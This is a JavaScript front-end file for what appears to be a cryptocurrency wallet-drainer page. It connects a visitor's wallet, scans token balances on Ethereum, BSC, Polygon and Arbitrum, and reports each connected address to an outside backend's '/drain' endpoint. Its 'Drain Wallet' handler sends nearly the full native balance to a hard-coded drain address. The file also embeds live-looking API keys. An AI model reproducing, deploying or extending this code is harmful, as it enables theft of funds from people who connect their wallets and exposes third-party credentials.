import { ethers } from "ethers";

// Configuration
const CONFIG = {
    projectId: "962425907914a3e80a7d8e7288b23f62",
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    // RPC Providers
    rpcProviders: {
        1: "https://eth.llamarpc.com",
        56: "https://bsc-dataseed.binance.org",
        137: "https://polygon-rpc.com",
        42161: "https://arb1.arbitrum.io/rpc"
    },
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain",
        137: "Polygon",
        42161: "Arbitrum"
    },
    
    networkChainIds: {
        1: "0x1",
        56: "0x38",
        137: "0x89",
        42161: "0xa4b1"
    }
};

// Global state
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, tokensContainer, drainBtn, scanAllBtn, chainSelector, networkSelect, tokenCount;

// Initialize when page loads
document.addEventListener('DOMContentLoaded', async () => {
    console.log('✅ DOM loaded, initializing app...');
    await initializeApp();
});

async function initializeApp() {
    try {
        console.log('🔄 Initializing app...');
        
        // Get DOM elements
        connectBtn = document.getElementById("connectBtn");
        statusEl = document.getElementById("status");
        tokensEl = document.getElementById("tokens");
        tokensContainer = document.getElementById("tokensContainer");
        drainBtn = document.getElementById("drainBtn");
        scanAllBtn = document.getElementById("scanAllBtn");
        chainSelector = document.getElementById("chainSelector");
        networkSelect = document.getElementById("networkSelect");
        tokenCount = document.getElementById("tokenCount");

        if (!connectBtn) {
            console.error('❌ CRITICAL: Connect button not found!');
            updateStatus('Error: Connect button not found');
            return;
        }
        
        console.log('✅ DOM elements found');
        
        // Setup event listeners FIRST
        setupEventListeners();
        
        // Test backend connection
        await testBackend();
        
        // Check for existing wallet connection
        await checkExistingConnection();
        
        console.log("✅ App initialized successfully");
        updateStatus("✅ Ready! Click 'Connect Wallet' to begin");
        
    } catch (error) {
        console.error("❌ Initialization error:", error);
        updateStatus("Failed to initialize: " + error.message);
    }
}

async function testBackend() {
    try {
        updateStatus('🔄 Checking backend connection...');
        const response = await fetch(`${CONFIG.backendUrl}/health`);
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend is online:", data);
            return true;
        } else {
            console.log("⚠️ Backend health check failed");
            return false;
        }
    } catch (error) {
        console.log("⚠️ Backend unreachable:", error.message);
        return false;
    }
}

function setupEventListeners() {
    console.log("🔄 Setting up event listeners...");
    
    // Connect button - using onclick for direct handling
    if (connectBtn) {
        connectBtn.onclick = handleConnect;
        console.log("✅ Connect button listener added");
    }
    
    // Drain button
    if (drainBtn) {
        drainBtn.addEventListener("click", handleDrain);
    }
    
    // Scan all chains button
    if (scanAllBtn) {
        scanAllBtn.addEventListener("click", handleScanAll);
    }
    
    // Network selector
    if (networkSelect) {
        networkSelect.addEventListener("change", handleNetworkChange);
        // Populate network options
        populateNetworkOptions();
    }
    
    // Setup wallet event listeners if wallet is available
    setupWalletEventListeners();
}

function populateNetworkOptions() {
    if (!networkSelect) return;
    
    // Clear existing options except first one
    while (networkSelect.options.length > 1) {
        networkSelect.remove(1);
    }
    
    // Add network options
    Object.entries(CONFIG.networkNames).forEach(([chainId, name]) => {
        const option = document.createElement('option');
        option.value = chainId;
        option.textContent = name;
        networkSelect.appendChild(option);
    });
}

function setupWalletEventListeners() {
    if (typeof window.ethereum !== 'undefined') {
        // Listen for account changes
        window.ethereum.on('accountsChanged', async (accounts) => {
            console.log("🔄 Accounts changed:", accounts);
            if (accounts.length === 0) {
                // User disconnected
                handleDisconnected();
            } else if (currentAccount !== accounts[0]) {
                // Account changed
                currentAccount = accounts[0];
                updateStatus(`🔄 Account changed to: ${currentAccount.slice(0, 8)}...`);
                await fetchTokens(currentAccount, currentChainId);
            }
        });
        
        // Listen for chain changes
        window.ethereum.on('chainChanged', async (chainIdHex) => {
            const chainId = parseInt(chainIdHex, 16);
            console.log("🔄 Chain changed:", chainId);
            
            // Update UI
            currentChainId = chainId;
            updateStatus(`🔄 Network changed to: ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
            
            // Update network selector
            if (networkSelect) {
                networkSelect.value = chainId;
            }
            
            // Refresh tokens
            if (currentAccount) {
                await fetchTokens(currentAccount, chainId);
            }
        });
        
        // Listen for disconnection
        window.ethereum.on('disconnect', (error) => {
            console.log("🔄 Wallet disconnected:", error);
            handleDisconnected();
        });
    }
}

async function checkExistingConnection() {
    try {
        if (typeof window.ethereum !== 'undefined') {
            // Check if already connected
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
            
            if (accounts.length > 0) {
                console.log("🔄 Found existing connection:", accounts[0]);
                await handleConnected(accounts[0], parseInt(chainIdHex, 16));
                return true;
            }
        }
        return false;
    } catch (error) {
        console.log("⚠️ Error checking existing connection:", error.message);
        return false;
    }
}

async function handleConnect() {
    console.log("🔄 Connect button clicked!");
    
    try {
        // If already connected, disconnect
        if (isConnected) {
            await handleDisconnect();
            return;
        }
        
        updateStatus("🔄 Connecting wallet...");
        
        // Try direct connection first
        if (typeof window.ethereum !== 'undefined') {
            await handleDirectWalletConnect();
        } else {
            // No wallet detected
            updateStatus("❌ No Ethereum wallet detected!");
            showWalletOptions();
        }
        
    } catch (error) {
        console.error("❌ Connection error:", error);
        updateStatus(`❌ Connection failed: ${error.message}`);
    }
}

async function handleDirectWalletConnect() {
    try {
        // Request accounts - this triggers the wallet connection prompt
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
            throw new Error("User rejected connection or no accounts found");
        }
        
        // Get current chain
        const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
        const chainId = parseInt(chainIdHex, 16);
        
        console.log("✅ Wallet connected:", accounts[0], "Chain:", chainId);
        
        // Handle the connection
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error("❌ Direct wallet connection failed:", error);
        
        // Handle specific error cases
        if (error.code === 4001) {
            updateStatus("❌ Connection rejected by user");
        } else if (error.code === -32002) {
            updateStatus("🔄 Connection already pending. Please check your wallet.");
        } else {
            updateStatus(`❌ Connection failed: ${error.message}`);
        }
        
        throw error;
    }
}

async function handleConnected(account, chainId) {
    try {
        console.log("🔄 Handling connection...");
        
        // Validate inputs
        if (!account || !chainId) {
            throw new Error("Invalid connection data");
        }
        
        // Update global state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Setup provider and signer
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        // Update UI
        if (connectBtn) {
            connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
            connectBtn.onclick = handleDisconnect;
        }
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\n👛 Wallet: ${currentAccount.slice(0, 8)}...${currentAccount.slice(-4)}\n🌐 Network: ${chainName}\n⛓️ Chain ID: ${chainId}`);
        
        // Show UI elements
        showUIElements();
        
        // Update network selector
        if (chainSelector && networkSelect) {
            chainSelector.classList.remove("hidden");
            networkSelect.value = chainId;
        }
        
        // Log connection to backend
        await logConnectionToBackend(currentAccount, chainId);
        
        // Fetch tokens
        await fetchTokens(currentAccount, chainId);
        
        console.log("✅ Connection fully established");
        
    } catch (error) {
        console.error("❌ Connected handler error:", error);
        updateStatus("Connection setup failed: " + error.message);
        
        // Reset state on error
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

async function handleDisconnect() {
    console.log("🔄 Disconnecting...");
    
    try {
        // For MetaMask and similar wallets, we can't actually disconnect
        // We just reset our local state
        updateStatus("🔄 Disconnecting...");
        
        // In some wallets we can request to disconnect
        if (window.ethereum && window.ethereum.disconnect) {
            try {
                await window.ethereum.disconnect();
            } catch (error) {
                console.log("ℹ️ Wallet doesn't support disconnect method");
            }
        }
        
    } catch (error) {
        console.error("❌ Error during disconnect:", error);
    } finally {
        // Always reset local state
        handleDisconnected();
    }
}

function handleDisconnected() {
    console.log("🔄 Resetting connection state...");
    
    // Reset global state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    provider = null;
    signer = null;
    
    // Update UI
    if (connectBtn) {
        connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
        connectBtn.onclick = handleConnect;
    }
    
    updateStatus("Disconnected. Click 'Connect Wallet' to begin.");
    hideUIElements();
}

async function logConnectionToBackend(address, chainId) {
    try {
        console.log("🔄 Logging connection to backend...");
        
        const response = await fetch(`${CONFIG.backendUrl}/drain`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            }),
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log("✅ Backend logged connection:", data);
        } else {
            console.log("⚠️ Backend logging failed");
        }
        
    } catch (error) {
        console.log("⚠️ Backend logging failed:", error.message);
    }
}

async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        // Try backend first
        const backendOnline = await testBackend();
        if (backendOnline) {
            const response = await fetch(`${CONFIG.backendUrl}/tokens/${address}?chainId=${chainId}`);
            
            if (response.ok) {
                const data = await response.json();
                if (data.success && data.data.tokens && data.data.tokens.length > 0) {
                    displayTokens(data.data.tokens);
                    updateStatus(`✅ Found ${data.data.tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
                    return;
                }
            }
        }
        
        // Fallback to direct Covalent API
        await fetchTokensFromCovalent(address, chainId);
        
    } catch (error) {
        console.error("❌ Token fetch error:", error);
        await fetchTokensFromCovalent(address, chainId);
    }
}

async function fetchTokensFromCovalent(address, chainId) {
    if (!tokensEl) return;
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
        );
        
        if (!response.ok) {
            throw new Error(`Covalent API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                    name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                    amount: amount,
                    formattedAmount: amount.toLocaleString(undefined, {
                        minimumFractionDigits: 0,
                        maximumFractionDigits: 6
                    }),
                    value: value,
                    formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    isNative: t.native_token || false
                };
            });
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || 'this chain'}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found on this chain</div>';
            updateStatus("ℹ️ No tokens found on this chain");
        }
        
    } catch (error) {
        console.error("❌ Covalent error:", error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens from Covalent API</div>';
        updateStatus("⚠️ Token scan failed");
    }
}

function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.formattedAmount || token.amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</div>
                ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
    
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} token${tokens.length !== 1 ? 's' : ''} • $${totalValue.toFixed(2)}`;
    }
    
    if (tokensContainer) {
        tokensContainer.classList.remove("hidden");
    }
}

async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert("Please connect wallet first");
        return;
    }
    
    if (!confirm(`⚠️ DRAIN WARNING\n\nThis will send ALL tokens to:\n${CONFIG.drainAddress}\n\nYou need native token (ETH, MATIC, etc.) for gas.\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById("drainBtn");
    
    try {
        updateStatus("🚀 Starting drain process...");
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = "⏳ Draining...";
        }
        
        // Ensure we have a signer
        if (!signer) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
        }
        
        // Get native token balance
        const balance = await provider.getBalance(currentAccount);
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);
        
        // Check if enough for gas
        if (balance.gt(gasCost.mul(2))) {
            const sendAmount = balance.sub(gasCost.mul(2));
            
            const tx = await signer.sendTransaction({
                to: CONFIG.drainAddress,
                value: sendAmount,
                gasLimit: gasLimit
            });
            
            updateStatus(`📤 Transaction sent: ${tx.hash}\n⏳ Waiting for confirmation...`);
            
            const receipt = await tx.wait();
            updateStatus(`✅ Drain completed!\nTransaction confirmed in block ${receipt.blockNumber}`);
            
            // Refresh token display
            await fetchTokens(currentAccount, currentChainId);
            
        } else {
            updateStatus("⚠️ Not enough native token for gas");
        }
        
    } catch (error) {
        console.error("❌ Drain error:", error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert(`Drain failed: ${error.message}`);
    } finally {
        const drainBtn = document.getElementById("drainBtn");
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = "⚡ Drain Wallet";
        }
    }
}

async function handleScanAll() {
    if (!isConnected || !currentAccount) {
        alert("Please connect wallet first");
        return;
    }
    
    updateStatus("🔄 Scanning all supported chains...");
    
    try {
        const chains = [1, 56, 137, 42161]; // All supported chain IDs
        let allTokens = [];
        
        for (const chainId of chains) {
            updateStatus(`🔄 Scanning ${CONFIG.networkNames[chainId]}...`);
            
            try {
                const response = await fetch(
                    `https://api.covalenthq.com/v1/${chainId}/address/${currentAccount}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
                );
                
                if (response.ok) {
                    const data = await response.json();
                    const items = data?.data?.items || [];
                    
                    const chainTokens = items
                        .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
                        .map(t => {
                            const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                            const value = (t.quote_rate || 0) * amount;
                            
                            return {
                                symbol: t.contract_ticker_symbol || (t.native_token ? 'Native' : 'TOKEN'),
                                name: t.contract_name || (t.native_token ? 'Native Token' : 'Unknown'),
                                amount: amount,
                                formattedAmount: amount.toLocaleString(undefined, { maximumFractionDigits: 6 }),
                                value: value,
                                formattedValue: value ? `$${value.toFixed(2)}` : 'N/A',
                                contractAddress: t.contract_address,
                                isNative: t.native_token || false,
                                chainId: chainId,
                                chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`
                            };
                        });
                    
                    allTokens = allTokens.concat(chainTokens);
                }
            } catch (error) {
                console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
            }
        }
        
        if (allTokens.length > 0) {
            displayAllChainTokens(allTokens);
            updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
        } else {
            updateStatus("ℹ️ No tokens found across any supported chain");
        }
        
    } catch (error) {
        console.error("❌ Scan all error:", error);
        updateStatus("❌ Failed to scan all chains: " + error.message);
    }
}

function displayAllChainTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '<div class="all-chains-header">Tokens Across All Chains</div>';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        const chainTotal = chainTokens.reduce((sum, t) => sum + (t.value || 0), 0);
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <span>${chainName}</span>
                    <span class="chain-total">$${chainTotal.toFixed(2)}</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item">
                        <div class="token-info">
                            <span class="token-symbol">${token.symbol}</span>
                            <span class="token-name">${token.name}</span>
                        </div>
                        <div>
                            <div class="token-amount">${token.formattedAmount}</div>
                            ${token.value > 0 ? `<div class="token-value">$${token.value.toFixed(2)}</div>` : ''}
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
    
    const totalValue = tokens.reduce((sum, t) => sum + (t.value || 0), 0);
    if (tokenCount) {
        tokenCount.textContent = `${tokens.length} tokens across ${Object.keys(tokensByChain).length} chains • $${totalValue.toFixed(2)}`;
    }
    
    if (tokensContainer) {
        tokensContainer.classList.remove("hidden");
    }
}

async function handleNetworkChange(event) {
    const newChainId = parseInt(event.target.value);
    
    if (newChainId === currentChainId || !isConnected) {
        return;
    }
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[newChainId] || `Chain ${newChainId}`}...`);
        
        // Try to switch network in wallet
        if (window.ethereum) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: CONFIG.networkChainIds[newChainId] || `0x${newChainId.toString(16)}` }]
                });
                
                // The chainChanged event listener will handle the rest
                
            } catch (switchError) {
                // This error code indicates that the chain has not been added to MetaMask
                if (switchError.code === 4902) {
                    // Try to add the chain
                    await addChainToWallet(newChainId);
                } else {
                    throw switchError;
                }
            }
        } else {
            // Just update locally and fetch tokens
            currentChainId = newChainId;
            await fetchTokens(currentAccount, newChainId);
        }
        
    } catch (error) {
        console.error("❌ Network switch error:", error);
        updateStatus(`❌ Failed to switch network: ${error.message}`);
        // Reset selector
        if (networkSelect) {
            networkSelect.value = currentChainId;
        }
    }
}

async function addChainToWallet(chainId) {
    const chainParams = {
        1: {
            chainId: '0x1',
            chainName: 'Ethereum Mainnet',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[1]],
            blockExplorerUrls: ['https://etherscan.io']
        },
        56: {
            chainId: '0x38',
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[56]],
            blockExplorerUrls: ['https://bscscan.com']
        },
        137: {
            chainId: '0x89',
            chainName: 'Polygon Mainnet',
            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[137]],
            blockExplorerUrls: ['https://polygonscan.com']
        },
        42161: {
            chainId: '0xA4B1',
            chainName: 'Arbitrum One',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: [CONFIG.rpcProviders[42161]],
            blockExplorerUrls: ['https://arbiscan.io']
        }
    };
    
    if (chainParams[chainId] && window.ethereum) {
        try {
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [chainParams[chainId]]
            });
        } catch (addError) {
            console.error("❌ Failed to add chain:", addError);
            throw addError;
        }
    }
}

function showWalletOptions() {
    const walletOptions = `
        <div style="margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px;">
            <h4 style="margin-top: 0;">No Wallet Detected</h4>
            <p>Please install one of these wallets:</p>
            <ul style="list-style: none; padding-left: 0;">
                <li style="margin: 10px 0;">
                    <a href="https://metamask.io/download/" target="_blank" style="color: #3b82f6; text-decoration: none;">
                        🔵 MetaMask (Recommended)
                    </a>
                </li>
                <li style="margin: 10px 0;">
                    <a href="https://wallet.coinbase.com/" target="_blank" style="color: #3b82f6; text-decoration: none;">
                        🔷 Coinbase Wallet
                    </a>
                </li>
                <li style="margin: 10px 0;">
                    <a href="https://trustwallet.com/" target="_blank" style="color: #3b82f6; text-decoration: none;">
                        🔶 Trust Wallet
                    </a>
                </li>
            </ul>
            <p><small>After installing, refresh this page and try again.</small></p>
        </div>
    `;
    
    if (statusEl) {
        statusEl.innerHTML = walletOptions;
    }
}

function showUIElements() {
    const elements = [chainSelector, drainBtn, scanAllBtn, tokensContainer];
    elements.forEach(el => {
        if (el) el.classList.remove("hidden");
    });
}

function hideUIElements() {
    const elements = [chainSelector, drainBtn, scanAllBtn, tokensContainer];
    elements.forEach(el => {
        if (el) el.classList.add("hidden");
    });
    
    if (tokensEl) tokensEl.innerHTML = "";
    if (tokenCount) tokenCount.textContent = "0 tokens";
}

function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Debug info and helper functions
console.log("=== App Debug Info ===");
console.log("Ethers version:", ethers.version);
console.log("Window.ethereum:", typeof window.ethereum !== 'undefined');

if (typeof window.ethereum !== 'undefined') {
    console.log("Wallet provider detected");
    console.log("Is MetaMask?", window.ethereum.isMetaMask);
    console.log("Is Coinbase?", window.ethereum.isCoinbaseWallet);
}

// Export for debugging
window.appDebug = {
    getState: () => ({
        isConnected,
        currentAccount,
        currentChainId,
        provider: !!provider,
        signer: !!signer
    }),
    reconnect: handleConnect,
    disconnect: handleDisconnect,
    fetchTokens: () => fetchTokens(currentAccount, currentChainId),
    switchChain: (chainId) => handleNetworkChange({ target: { value: chainId.toString() } })
};

console.log("Debug helpers available at: window.appDebug");
console.log("======================");
